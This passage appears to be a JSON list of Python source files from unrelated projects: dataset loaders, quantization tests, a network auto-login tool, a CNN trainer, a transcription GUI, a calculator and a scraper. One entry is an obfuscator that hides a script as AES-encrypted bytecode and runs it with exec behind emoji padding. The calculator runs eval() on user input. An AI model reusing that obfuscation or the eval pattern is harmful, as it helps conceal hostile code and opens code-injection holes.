dataInfo['file_names'] = dataInfo['file_names'].str.strip(\"[']\")\n            video_names = [video_name.replace('yuv', 'mp4') for video_name in dataInfo['file_names'].tolist()]\n            scores = dataInfo['MOS'].tolist()\n            video_names, scores = self.load_subset_video_names_scores(dataset_name, video_names, scores, seed)\n        elif dataset_name == 'LSVQ_train_all':\n            dataInfo = pd.read_csv(filename_path)\n            video_names = dataInfo['name'].tolist()\n            scores = dataInfo['mos'].tolist()\n        elif dataset_name == 'LSVQ_train':\n            dataInfo = pd.read_csv(filename_path)\n            video_names = dataInfo['name'].tolist()[:int(len(dataInfo) * 0.8)]\n            scores = dataInfo['mos'].tolist()[:int(len(dataInfo) * 0.8)]\n        elif dataset_name == 'LSVQ_val':\n            dataInfo = pd.read_csv(filename_path)\n            video_names = dataInfo['name'].tolist()[int(len(dataInfo) * 0.8):]\n            scores = dataInfo['mos'].tolist()[int(len(dataInfo) * 0.8):]\n        elif dataset_name == 'LSVQ_test':\n            dataInfo = pd.read_csv(filename_path)\n            video_names = dataInfo['name'].tolist()\n            scores = dataInfo['mos'].tolist()\n        elif dataset_name == 'LSVQ_test_1080p':\n            dataInfo = pd.read_csv(filename_path)\n            video_names = dataInfo['name'].tolist()\n            scores = dataInfo['mos'].tolist()\n        else:\n            raise ValueError(f\"Unsupported database name: {dataset_name}\")\n        \n        return video_names, scores\n\n\n    def load_subset_video_names_scores(self, dataset_name, video_names, scores, seed):\n        n_videos = len(video_names)\n        random.seed(seed)\n        np.random.seed(seed)\n        index_rd = np.random.p",
    "# Copyright (c) 2021 - present / Neuralmagic, Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport pytest\nimport torch\nfrom compressed_tensors.quantization import (\n    QuantizationArgs,\n    QuantizationConfig,\n    QuantizationScheme,\n    QuantizationStatus,\n    QuantizationStrategy,\n    apply_quantization_config,\n)\nfrom torch.nn import Linear\n\n\ndef create_config(\n    input_symmetry, weight_symmetry, w_strategy, i_strategy=None, group_size=None\n):\n    weights = QuantizationArgs(\n        symmetric=weight_symmetry, strategy=w_strategy, group_size=group_size\n    )\n    if input_symmetry is not None:\n        inputs = QuantizationArgs(\n            symmetric=input_symmetry, strategy=i_strategy, group_size=group_size\n        )\n    else:\n        inputs = None\n\n    config_groups = {\n        \"group_1\": QuantizationScheme(\n            targets=[\"Linear\"], weights=weights, input_activations=inputs\n        )\n    }\n    config = QuantizationConfig(\n        config_groups=config_groups, quantization_status=QuantizationStatus.CALIBRATION\n    )\n    return config\n\n\n@torch.no_grad\n@pytest.mark.parametrize(\"input_symmetry\", [None])\n@pytest.mark.parametrize(\"weight_symmetry\", [True, False])\n@pytest.mark.parametrize(\"model_shape\", [(64, 128), (300, 200), (400, 400)])\ndef test_channelwise(input_symmetry, weight_symmetry, model_shape):\n    model = Linear(model_shape[0], model_shape[1])\n    quant_config = create_config(\n        input_symmetry, weight_symmetry, w_strategy=QuantizationStrategy.CHANNEL\n    )\n    apply_quantization_config(model, quant_config)\n\n    inputs = torch.randn(32, model_shape[0])\n    model(inputs)\n\n    assert list(model.weight_scale.shape) == [model_shape[1], 1]\n    assert list(model.weight_zero_point.shape) == [model_shape[1], 1]\n\n\n@torch.no_grad\n@pytest.mark.parametrize(\"input_symmetry\", [None])\n@pytest.mark.parametrize(\"weight_symmetry\", [True, False])\n@pytest.mark.parametrize(\"model_shape\", [(128, 256), (256, 512), (512, 1024)])\n@pytest.mark.parametrize(\"group_size\", [32, 128])\ndef test_group(input_symmetry, weight_symmetry, model_shape, group_size):\n    model = Linear(model_shape[0], model_shape[1])\n    quant_config = create_config(\n        input_symmetry,\n        weight_symmetry,\n        w_strategy=QuantizationStrategy.GROUP,\n        group_size=group_size,\n    )\n    apply_quantization_config(model, quant_config)\n\n    inputs = torch.randn(128, model_shape[0])\n    model(inputs)\n\n    assert list(model.weight_scale.shape) == [\n        model_shape[1],\n        int(model_shape[0] / group_size),\n    ]\n    assert list(model.weight_zero_point.shape) == [\n        model_shape[1],\n        int(model_shape[0] / group_size),\n    ]\n\n\n@torch.no_grad\n@pytest.mark.parametrize(\"input_symmetry\", [True, False])\n@pytest.mark.parametrize(\"weight_symmetry\", [True, False])\n@pytest.mark.parametrize(\"input_shape\", [(32, 256), (300, 200), (400, 400)])\ndef test_token(input_symmetry, weight_symmetry, input_shape):\n    model = Linear(input_shape[1], 256)\n    quant_config = create_config(\n        input_symmetry,\n        weight_symmetry,\n        w_strategy=QuantizationStrategy.CHANNEL,\n        i_strategy=QuantizationStrategy.TOKEN,\n    )\n    apply_quantization_config(model, quant_config)\n\n    inputs = torch.randn(input_shape)\n    model(inputs)\n\n    assert list(model.input_scale.shape) == [1, input_shape[1]]\n    assert list(model.input_zero_point.shape) == [1, input_shape[1]]\n\n    assert list(model.weight_scale.shape) == [256, 1]\n    assert list(model.weight_zero_point.shape) == [256, 1]\n",
    "# Ngapain bang? Minimal Credit cuihh\r\n# Copyright 2024 \u00a9 \u2022 NyctophileSkyzo\r\n# https://github.com/NyctophileSkyzo/AES-ECB\r\n# Recode? Credit pls\r\n\r\nimport os,sys\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import pad, unpad\r\nimport base64\r\nimport random\r\nimport marshal\r\n\r\ndef encrypt_code(code, key):\r\n    watermark = \"NyctophileSkyzo\"\r\n    # Add watermark to the code before encryption\r\n    code_with_watermark = f\"{code}\\n# Watermark: {watermark}\"\r\n    # Compile the code into a code object\r\n    compiled_code = compile(code_with_watermark, '<string>', 'exec')\r\n    # Convert the compiled code into bytecode\r\n    bytecode = marshal.dumps(compiled_code)\r\n    cipher = AES.new(key, AES.MODE_ECB)\r\n    padded_bytecode = pad(bytecode, AES.block_size)\r\n    encrypted_bytecode = cipher.encrypt(padded_bytecode)\r\n    return base64.b64encode(encrypted_bytecode).decode('utf-8')\r\n\r\ndef encrypt_message(message, key):\r\n    cipher = AES.new(key, AES.MODE_ECB)\r\n    padded_message = pad(message.encode(), AES.block_size)\r\n    encrypted_message = cipher.encrypt(padded_message)\r\n    return base64.b64encode(encrypted_message).decode('utf-8')\r\n\r\ndef obfuscate_code(code):\r\n    # Example obfuscation technique: replace all occurrences of 'exec' with 'x_x_e_c'\r\n    obfuscated_code = code.replace('exec', 'x_x_e_c')\r\n    return obfuscated_code\r\n\r\ndef clear_terminal():\r\n    # Untuk Windows\r\n    if os.name == 'nt':\r\n        _ = os.system('cls')\r\n    # Untuk MacOS dan Linux\r\n    else:\r\n        _ = os.system('clear')\r\n\r\n# Panggil fungsi clear_terminal() untuk membersihkan terminal\r\n# clear_terminal()\r\n\r\ndef banner():\r\n    print (\"\"\"\r\n\r\n  __   ____  ____        ____  ___  ____\r\n / _\\ (  __)/ ___)  ___ (  __)/ __)(  _ )\r\n/    \\ ) _) \\___ \\ (___) ) _)( (__  ) _ (\r\n\\_/\\_/(____)(____/      (____)\\___)(____/\r\n\r\n \u2022 Github : github.com/NyctophileSkyzo\r\n \u2022 Info   : AES-ECB Python3 Encryption\r\n\"\"\")  #  \u2022 Creator: NathVaskyloClearesta\r\n\r\ndef main():\r\n    clear_terminal()\r\n    banner()\r\n    input_file = input(\" \u2022 Enter File Name (exam:main.py): \")\r\n\r\n    try:\r\n        with open(input_file, 'r') as file:\r\n            code = file.read()\r\n    except FileNotFoundError:\r\n        print(\"File not found.\")\r\n        return\r\n\r\n    # Generate random 16-byte key\r\n    key = bytes([random.randint(0, 255) for _ in range(16)])\r\n    \r\n    # Obfuscate source code\r\n    obfuscated_code = obfuscate_code(code)\r\n    \r\n    # Encrypt source code\r\n    encrypted_code = encrypt_code(obfuscated_code, key)\r\n    \r\n    # Encrypt access denied message\r\n    access_denied_message = \"Cannot run: Credit has been removed, access denied\"\r\n    encrypted_message = encrypt_message(access_denied_message, key)\r\n\r\n    # Define variable c\r\n    c = base64.b64encode('NyctophileSkyzo'.encode()).decode('utf-8')\r\n    \r\n    output_file = input_file.split('.')[0] + \"_AESECB.py\"\r\n\r\n    with open(output_file, 'w') as file:\r\n        file.write(f\"\\n\")\r\n        file.write(f\"VARIABLE_AES = (\")\r\n        for _ in range(3000):\r\n           file.write('\"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\", \"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\", \"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\",\\n')\r\n        file.write(\")\\n\")\r\n        file.write(f\"from Crypto.Cipher import AES\\n\")\r\n        file.write(f\"from Crypto.Util.Padding import unpad\\n\")\r\n        file.write(f\"import sys\\n\")\r\n        file.write(f\"\\n\")\r\n        file.write(f\"key = {key}\\n\")\r\n        file.write(f\"VARIABLE_AESECB = (\")\r\n        for _ in range(10000):\r\n           file.write('\"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\", \"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\", \"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\",\\n')\r\n        file.write(\")\\n\")\r\n        file.write(f\"cipher = AES.new(key, AES.MODE_ECB)\\n\")\r\n        file.write(f\"encrypted_code = __import__('base64').b64decode('{encrypted_code}')\\n\")\r\n        file.write(f\"decrypted_bytecode = unpad(cipher.decrypt(encrypted_code), AES.block_size)\\n\")\r\n        file.write(f\"compiled_code = __import__('marshal').loads(decrypted_bytecode)\\n\")\r\n        file.write(f\"motherfuck = (\")\r\n        for _ in range(10000):\r\n            file.write('\"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\", \"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\", \"\ud83d\ude01\", \"\ud83d\udc80\", \"\ud83e\udd76\", \"\ud83d\ude06\", \"\ud83e\udd23\", \"\ud83d\ude18\", \"\ud83d\ude1c\",\\n')\r\n        file.write(\")\\n\")\r\n        file.write(f\"_executecode = exec\\n\")  # Define 'exec' with obfuscated name\r\n        file.write(f\"_exec = '{c}'\\n\")  # Define 'c' with obfuscated name\r\n        file.write(f\"run_code = lambda: _executecode(compiled_code, globals())\\n\")  # Define lambda function\r\n        file.write(f\"try:\\n\")\r\n        file.write(f\"    if __import__('base64').b64decode(_exec.encode()).decode('utf-8') != 'NyctophileSkyzo':\\n\")\r\n        file.write(f\"        raise Exception('Cannot run: Credit has been removed, access denied')\\n\")\r\n        file.write(f\"    run_code()\\n\")  # Execute lambda function\r\n        file.write(f\"except Exception as e:\\n\")\r\n        file.write(f\"    print('Error during execution:', e)\\n\")\r\n        file.write(f\"    sys.exit(1)\\n\")\r\n        file.write(f\"fucked = (\")\r\n        for _ in range(9000):\r\n        ",
    "import os\r\nimport sys\r\nimport requests\r\nfrom Network_PopWindow import NotificationPopup\r\nfrom Network_Logs import Logger\r\nfrom Network_encryption import decrypt\r\nimport Network_method as NM\r\nimport re\r\n\r\n\r\nclass NetworkLogin:\r\n    def __init__(self):\r\n        self.Retry_interval = 3\r\n        self.Monitoring_interval = 3\r\n\r\n        self.url = \"\"\r\n        self.website = \"\"\r\n        self.HomePageField = \"\"\r\n        self.LoginPageField = \"\"\r\n        self.Automatic_login = True\r\n        self.window = None\r\n        self.exe_path = os.path.abspath(sys.argv[0])\r\n        self.popup = NotificationPopup()\r\n        self.logger = Logger()\r\n        self.ICONS_PATH = \"icos\\\\\"\r\n        self.CHECK_ICON = \"Check.ico\"\r\n        self.NETWORK_ICON = \"Network.ico\"\r\n        self.ERROR_ICON = \"error.ico\"\r\n        self.CROSS_ICON = \"cross.ico\"\r\n\r\n    def _get_icon_path(self, icon_name):\r\n        return os.path.join(os.path.dirname(self.exe_path), self.ICONS_PATH, icon_name)\r\n\r\n    def change_Automatic_login(self, Automatic_login):\r\n        self.Automatic_login = Automatic_login\r\n\r\n    def read_setting(self):\r\n        setting_path = os.path.join(os.path.dirname(self.exe_path), \"setting\")\r\n        try:\r\n            with open(setting_path, \"rb\") as f:\r\n                for line in f:\r\n                    line = line.decode().strip()\r\n                    key, value = line.split(\":\", 1)\r\n                    key = key.strip()\r\n                    value = value.strip()\r\n                    if key == \"website\":\r\n                        self.website = value\r\n                    elif key == \"HomePageField\":\r\n                        self.HomePageField = value\r\n                    elif key == \"LoginPageField\":\r\n                        self.LoginPageField = value\r\n                    elif key == \"Automatic_login\":\r\n                        self.Automatic_login = value.lower() == \"true\"\r\n        except FileNotFoundError:\r\n            self.popup.set_content(\"setting\u6587\u4ef6\u4e22\u5931\", \"\u8bf7\u4f7f\u7528\u5f3a\u5236\u91cd\u7f6e\u529f\u80fd\",\r\n                                   self._get_icon_path(self.ERROR_ICON))\r\n            self.popup.show()\r\n\r\n            NM.change_windowicon(self.window, self._get_icon_path(self.ERROR_ICON))\r\n            self.logger.log_error(\"<ReadFileError>:The setting file content is lost\")\r\n\r\n    def is_valid_website(self):\r\n        # \u68c0\u67e5\u662f\u5426\u4e3a\u7a7a\r\n        if not self.website:\r\n            print(\"Website is empty\")\r\n            self.logger.log_error(\"<WebsiteError>:Url is empty\")\r\n            return False\r\n\r\n        # \u68c0\u67e5\u662f\u5426\u7b26\u5408\u7f51\u5740\u7684\u8981\u6c42\r\n        url_pattern = re.compile(r\"^(http|https)://.*/$\", re.IGNORECASE)\r\n\r\n        if re.match(url_pattern, self.website):\r\n            return True\r\n        else:\r\n            print(\"Invalid website\")\r\n            self.logger.log_error(\"<WebsiteError>:Url format error\")\r\n            return False\r\n\r\n    def is_internet_available(self):\r\n        if not self.is_valid_website():\r\n            self.popup.set_content(\"\u767b\u5f55\u7f51\u5740\u9519\u8bef\u6216\u4e22\u5931\", \"\u8bf7\u4f7f\u7528\u5f3a\u5236\u91cd\u7f6e\u529f\u80fd\",\r\n                                   self._get_icon_path(self.ERROR_ICON))\r\n            self.popup.show()\r\n            return\r\n        try:\r\n            response = requests.get(self.website, timeout=1)\r\n            if self.HomePageField in response.text:\r\n                return \"unconnected\"\r\n        except:\r\n            return \"ServiceException\"\r\n        return \"Connected\"\r\n\r\n    def login_to_network(self):\r\n        print(\"login to network\")\r\n        if not all(self.url):\r\n            self.popup.set_content(\"Get\u8bf7\u6c42url\u4e22\u5931\", \"\u8bf7\u4f7f\u7528\u5f3a\u5236\u91cd\u7f6e\u529f\u80fd\",\r\n                                   self._get_icon_path(self.ERROR_ICON))\r\n            self.popup.show()\r\n\r\n            NM.change_windowicon(self.window, self._get_icon_path(self.ERROR_ICON))\r\n            self.logger.log_event(\"<Network>:Get url is None\")\r\n        else:\r\n            response = requests.get(self.url)\r\n            if self.LoginPageField in response.text:\r\n                print(\"\u54cd\u5e94\u5185\u5bb9\u4e2d\u5305\u542b '\u7528\u6237\u4fe1\u606f\u9875' \u5b57\u6bb5\")\r\n                return True\r\n            else:\r\n                print(\"\u54cd\u5e94\u5185\u5bb9\u4e2d\u4e0d\u5305\u542b '\u7528\u6237\u4fe1\u606f\u9875' \u5b57\u6bb5\")\r\n                return False\r\n\r\n    def url_decryption(self):\r\n        url_file_path = os.path.join(os.path.dirname(self.exe_path), \"url\")\r\n        key_file_path = os.path.join(os.path.dirname(self.exe_path), \"url_key\")\r\n        try:\r\n            with open(url_file_path, 'rb') as f:\r\n                encrypted_url = f.read()\r\n            with open(key_file_path, 'rb') as f:\r\n                key = f.read()\r\n            url = decrypt(encrypted_url, key)\r\n        except FileNotFoundError:\r\n            self.popup.set_content(\"url\u6587\u4ef6\u4ee5\u53ca\u5bc6\u94a5\u6587\u4ef6\u4e22\u5931\", \"\u8bf7\u4f7f\u7528\u5f3a\u5236\u91cd\u7f6e\u529f\u80fd\",\r\n                                   self._get_icon_path(self.ERROR_ICON))\r\n            self.popup.show()\r\n\r\n            NM.change_windowicon(self.window, self._get_icon_path(self.ERROR_ICON))\r\n\r\n            self.logger.log_error(\"<Network>:url or key File Not Found Error\")\r\n            return None\r\n        else:\r\n            self.url = url\r\n\r\n    def set_window(self, window):\r\n        self.window = window\r\n\r\n    def check_internet_connection(self):\r\n\r",
    "# %%\nrun_name = \"new\"\n\nimport torch.utils.tensorboard\nfrom collections import OrderedDict\nfrom natsort import natsorted\nimport pathlib\nimport random\nimport shutil\nfrom itertools import groupby\n\nfrom lightning.pytorch.callbacks.early_stopping import EarlyStopping\nfrom lightning.pytorch.callbacks.model_checkpoint import ModelCheckpoint\nimport random\n\n\nimport lightning.pytorch.utilities.seed as seed\nimport torch\nfrom torchvision.datasets import ImageFolder\nimport lightning.pytorch as pl\nimport lightning.pytorch.loggers\nimport torch.nn as nn\nfrom torch.nn import functional as F\nfrom PIL import Image\n\nimport torch.utils.data as tdata\nimport torchmetrics\nimport torchmetrics.classification\nimport torchvision\nimport pydantic\nfrom torch.utils.data import Subset, ConcatDataset\n\nfrom more_itertools import partition\n\ntorch.set_float32_matmul_precision(\"high\")\n\n\ndataset_name = \"n11939491\"\n\n\ndef const_init(model, fill=0.0):\n    for name, param in model.named_parameters():\n        param.data.fill_(fill)\n\n\ndef shuffled(x):\n    x = list(x)\n    return random.sample(x, len(x))\n\n\nsegments_dir = pathlib.Path(\"./data/segments/\")\ntrain_dir = pathlib.Path(\"./data/train/\")\n\nsave_dir = pathlib.Path(\"./models/\") / run_name\nsave_dir.mkdir(exist_ok=True, parents=True)\n(save_dir / \"best\").mkdir(exist_ok=True, parents=True)\n\n\nclass Tree(pydantic.BaseModel):\n    tree: dict[str, list[str]]\n    start_dir: pathlib.Path\n    end_dir: pathlib.Path\n    save_dir: pathlib.Path\n\n\ntree = Tree(\n    tree={\n        \"petal\": [],\n        \"disk\": [],\n        \"flower_head\": [\"disk\", \"petal\"],\n        \"leaf\": [],\n        \"stem\": [],\n        dataset_name: [\"flower_head\", \"stem\", \"leaf\"],\n    },\n    start_dir=segments_dir,\n    end_dir=train_dir,\n    save_dir=save_dir,\n)\n\nall_cnns = {}\n\n\ndef load_frozen(model, ckpt, _req_grad=False, **kwds):\n    result = model.load_from_checkpoint(ckpt, **kwds).to(\"cuda\")\n    result.eval()\n    for i in result.parameters():\n        i.requires_grad = _req_grad\n    return result\n\n\nclass TreeCNN(pl.LightningModule):\n    cnn_children: dict[str, \"TreeCNN\"]\n    name: str\n\n    class Constants(pydantic.BaseModel):\n        data_dir: pathlib.Path\n        batch_size: int\n        crop_size: int\n        learning_rate: float\n\n    constants: Constants\n\n    class Dataset(pydantic.BaseModel):\n        train: tdata.Dataset | None\n        val: tdata.Dataset | None\n        test: tdata.Dataset | None\n\n        all_test: tdata.Dataset | None\n\n        class Config:\n            arbitrary_types_allowed = True\n\n    dataset: Dataset\n\n    def __init__(\n        self,\n        tree: Tree,\n        name: str,\n        is_root: bool = False,\n        inference: bool = False,\n    ):\n        super().__init__()\n        self.save_hyperparameters()\n\n        best = \"\"\n\n        self.is_root = is_root\n        self.name = name\n\n        self.cnn_children = {\n            children_name: all_cnns.setdefault(\n                children_name,\n                load_frozen(\n                    model=self.__class__,\n                    ckpt=tree.save_dir / best / f\"{children_name}.ckpt\",\n                    tree=tree,\n                    name=children_name,\n                    inference=inference,\n                ),\n            )\n            for children_name in tree.tree[name]\n        }\n\n        is_leaf = not self.cnn_children\n\n        def get_constants(is_leaf: bool, is_root: bool) -> \"TreeCNN.Constants\":\n            return TreeCNN.Constants(\n                learning_rate=1e-2,\n                batch_size=256,\n                data_dir=tree.end_dir if is_root else tree.start_dir,\n                crop_size=256 if is_leaf and not is_root else 512,\n            )\n\n        self.constants = get_constants(is_leaf=is_leaf, is_root=is_root)\n\n        self.accuracy = torchmetrics.Accuracy(task=\"binary\")\n        self.f1 = torchmetrics.classification.BinaryF1Score()\n        self.transform = torchvision.transforms.Compose(\n            [\n                torchvision.transforms.ToTensor(),\n            ]\n        )\n        self.dataset_transform = torchvision.transforms.Compose(\n            [\n                torchvision.transforms.RandomAffine(0, translate=(0.1, 0.1)),\n                torchvision.transforms.CenterCrop(\n                    (self.constants.crop_size, self.constants.crop_size)\n                ),\n                self.transform,\n            ]\n        )\n\n        def get_model(is_leaf):\n            def factory_conv2d(\n                input_channels,\n                output_channels,\n                kernel_size,\n                pool_size=4,\n                batch_norm=True,\n            ):\n                return nn.Sequential(\n                    OrderedDict(\n                        {\n                            \"conv1\": nn.Conv2d(\n                                input_channels, output_channels, kernel_size, bias=False\n                            ),\n                            \"norm\": nn.BatchNorm2d(output_channels)\n                            if batch_norm\n                            else nn.Ident",
    "import tkinter as tk\nfrom tkinter import filedialog, messagebox, scrolledtext\nimport os\nimport threading\nfrom pydub import AudioSegment\nfrom vosk import Model, KaldiRecognizer\nimport wave\nimport json\n\ndef convert_to_wav(audio_path, output_directory):\n    if not audio_path.lower().endswith('.wav'):\n        output_path = os.path.join(output_directory, os.path.basename(audio_path).rsplit('.', 1)[0] + '.wav')\n        audio = AudioSegment.from_file(audio_path, format=audio_path.split('.')[-1])\n        audio.export(output_path, format=\"wav\")\n        return output_path\n    else:\n        return audio_path\n\ndef transcribe_audio_vosk(audio_path, model_path, callback):\n    try:\n        model = Model(model_path)\n        with wave.open(audio_path, \"rb\") as wf:\n            recognizer = KaldiRecognizer(model, wf.getframerate())\n            full_transcription = \"\"\n            while True:\n                data = wf.readframes(4000)\n                if len(data) == 0:\n                    break\n                if recognizer.AcceptWaveform(data):\n                    part_result = json.loads(recognizer.Result())\n                    full_transcription += part_result.get('text', '') + \" \"\n            part_result = json.loads(recognizer.FinalResult())\n            full_transcription += part_result.get('text', '')\n        callback(full_transcription.strip())\n    except Exception as e:\n        messagebox.showerror(\"Error\", f\"Failed to transcribe audio. Error: {e}\")\n\ndef update_transcription_text(transcription):\n    transcription_text.configure(state='normal')\n    transcription_text.delete(1.0, tk.END)\n    transcription_text.insert(tk.END, transcription)\n    transcription_text.configure(state='disabled')\n\ndef select_model_path():\n    model_path_value = filedialog.askdirectory()\n    if model_path_value:\n        model_path.set(model_path_value)\n\ndef select_file():\n    model_path_value = model_path.get()\n    if not model_path_value or not os.path.exists(model_path_value):\n        messagebox.showerror(\"Error\", \"Please select a valid Vosk model directory.\")\n        return\n    \n    file_path = filedialog.askopenfilename()\n    if file_path:\n        output_directory = None\n        if not file_path.lower().endswith('.wav'):\n            output_directory = filedialog.askdirectory(title=\"Select Output Directory for WAV Conversion\")\n            if not output_directory:\n                messagebox.showerror(\"Error\", \"Output directory is required for non-WAV files.\")\n                return\n            file_path = convert_to_wav(file_path, output_directory)\n\n        # Transcription is run on a separate thread to keep GUI responsive\n        threading.Thread(target=transcribe_audio_vosk, args=(file_path, model_path_value, update_transcription_text), daemon=True).start()\n\nroot = tk.Tk()\nroot.title(\"AudioDictate\")\n\n# Model path selection\nmodel_path_frame = tk.Frame(root)\nmodel_path_label = tk.Label(model_path_frame, text=\"Vosk Model Path:\")\nmodel_path_label.pack(side=tk.LEFT, padx=(0, 10))\nmodel_path = tk.StringVar()\nmodel_path_entry = tk.Entry(model_path_frame, textvariable=model_path, width=50)\nmodel_path_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)\nmodel_path_button = tk.Button(model_path_frame, text=\"Select\", command=select_model_path)\nmodel_path_button.pack(side=tk.LEFT)\nmodel_path_frame.pack(pady=5, padx=5, fill=tk.X)\n\n# Transcription display area\ntranscription_frame = tk.LabelFrame(root, text=\"Transcription\")\ntranscription_text = scrolledtext.ScrolledText(transcription_frame, width=60, height=15, state='disabled')\ntranscription_text.pack(expand=True, fill=tk.BOTH, padx=5, pady=5)\ntranscription_frame.pack(pady=10, padx=5, fill=tk.BOTH, expand=True)\n\n# Button to select file\nselect_file_button = tk.Button(root, text=\"Select Audio File\", command=select_file)\nselect_file_button.pack(pady=5)\n\nroot.mainloop()\n",
    "from functools import wraps\nfrom typing import Optional\n\nfrom qdrant_client import QdrantClient\n\nclient = QdrantClient(\":memory:\")\nout_store = {}\n\n\ndef semantic_cache(similarity_threshold: Optional[float] = None):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            func_name = func.__name__\n            arg_desc = \", \".join([f\"arg{i}: {str(arg)}\" for i, arg in enumerate(args)])\n            kwarg_desc = \", \".join([f\"{k}={str(v)}\" for k, v in kwargs.items()])\n\n            params_str = f\"Function: {func_name}\\nArguments: {arg_desc}\\nKeyword Arguments: {kwarg_desc}\"\n\n            fn_cache_name = str(hash(func.__code__))\n            if client.collection_exists(fn_cache_name):\n                embeddings = client.query(\n                    collection_name=fn_cache_name,\n                    query_text=params_str,\n                    limit=1,\n                )\n                if embeddings:\n                    embedding = embeddings[0]\n                    key = (\n                        embedding.metadata[\"args\"],\n                        frozenset(embedding.metadata[\"kwargs\"].items()),\n                    )\n                    score = embedding.score\n                    if score >= (similarity_threshold or 0.95):\n                        if key in out_store:\n                            return out_store[key]\n\n            client.add(\n                documents=[params_str],\n                collection_name=fn_cache_name,\n                metadata=[{\"args\": args, \"kwargs\": kwargs}],\n                ids=[str(hash(params_str))],\n            )\n\n            out = func(*args, **kwargs)\n            key = (args, frozenset(kwargs.items()))\n            out_store[key] = out\n            return out\n\n        return wrapper\n\n    return decorator\n",
    "\r\nfrom tkinter import*\r\n\r\n\r\ncalc = Tk()\r\ncalc.title(\"parthiv calculator\")\r\ncalc.minsize(width=364, height=523)\r\ncalc.maxsize(width=364, height=523)\r\n#Code For Icon (Paste Here)\r\n\r\ndef displaybox(source, side):\r\n    storeObj = Frame (source, borderwidth=4, bg=\"#566573\")\r\n    storeObj.pack(side=side, expand=YES, fill=BOTH)\r\n    return storeObj\r\n\r\ndef button(source, side, text, command=None):\r\n    storeObj = Button(source, bg=\"black\", fg=\"cyan\", text=text, command=command)\r\n    storeObj.pack(side=side, expand=YES, fill=BOTH)\r\n    return storeObj\r\n\r\nclass app(Frame):\r\n    def __init__(self):\r\n        Frame. __init__(self)\r\n        self.option_add('Font', 'Digital-7 Mono')\r\n        self.option_add('size','500')\r\n        self.pack(expand=YES, fill=BOTH)\r\n\r\n\r\n        display = StringVar()\r\n        Entry(self, relief=RIDGE,\r\n                textvariable=display,justify='right',bd=26,fg=\"cyan\",bg=\"black\").pack(side=TOP, expand=YES,\r\n                        fill=BOTH)\r\n\r\n        for clearBut in([\"CLEAR\"],):\r\n            erase = displaybox(self, TOP)\r\n            for ichar in clearBut:\r\n                button(erase, LEFT, ichar,\r\n                       lambda storeObj=display, q=ichar: storeObj.set(''))\r\n\r\n        for NumBut in (\"789/\", \"456*\", \"123-\", \"0.+\"):\r\n            FunctionNum = displaybox(self, TOP)\r\n            for char in NumBut:\r\n                button(FunctionNum, LEFT, char,\r\n                       lambda storeObj=display, q=char: storeObj.set(storeObj.get() + q))\r\n\r\n        EqualsButton = displaybox(self, TOP)\r\n        for iEquals in \"=\":\r\n            if iEquals == '=':\r\n                btniEquals = button(EqualsButton, LEFT, iEquals)\r\n                btniEquals.bind('<ButtonRelease-1>',\r\n                         lambda e, s=self, storeObj=display: s.calc(storeObj), '+')\r\n            else:\r\n                btniEquals = button(EqualsButton, LEFT, iEquals,\r\n                   lambda storeObj=display, s=' %s '%iEquals: storeObj.set(storeObj.get()+s))\r\n\r\n\r\n    def calc(self, display):\r\n        try:\r\n            display.set(eval(display.get()))\r\n        except:\r\n            display.set(\"::Error::\")\r\n\r\nif __name__ == '__main__':\r\n    app().mainloop()\r\n",
    "import os\nimport requests\nfrom lxml import etree\nfrom openpyxl import Workbook\n\n# \u8bfb\u53d6\u94fe\u63a5\u6587\u672c\u6587\u4ef6\nfile_name = \"links.txt\"\nwith open(file_name, \"r\") as file:\n    links = file.read().splitlines()\n\n# \u521b\u5efaExcel\u8868\u683c\nworkbook = Workbook()\nworksheet = workbook.active\n\n# \u5199\u5165\u8868\u5934\nworksheet.append([\"\u6807\u9898\", \"\u5206\u7c7b\", \"\u7b80\u4ecb\", \"\u6807\u7b7e\", \"\u94fe\u63a5\", \"\u63cf\u8ff0\"])\n\n# \u8bbf\u95ee\u6bcf\u4e2a\u94fe\u63a5\u5e76\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9\ntotal_links = len(links)  # \u603b\u94fe\u63a5\u6570\nprocessed_links = 0  # \u5df2\u5904\u7406\u7684\u94fe\u63a5\u6570\nfailed_links = []  # \u5904\u7406\u5931\u8d25\u7684\u94fe\u63a5\nsuccessful_links = []  # \u5904\u7406\u6210\u529f\u7684\u94fe\u63a5\n\nfor link in links:\n    processed_links += 1\n\n    try:\n        response = requests.get(link)\n        html_content = response.text\n\n        # \u4f7f\u7528lxml\u89e3\u6790html\u5185\u5bb9\n        tree = etree.HTML(html_content)\n\n        # \u63d0\u53d6\u6807\u9898\n        title = 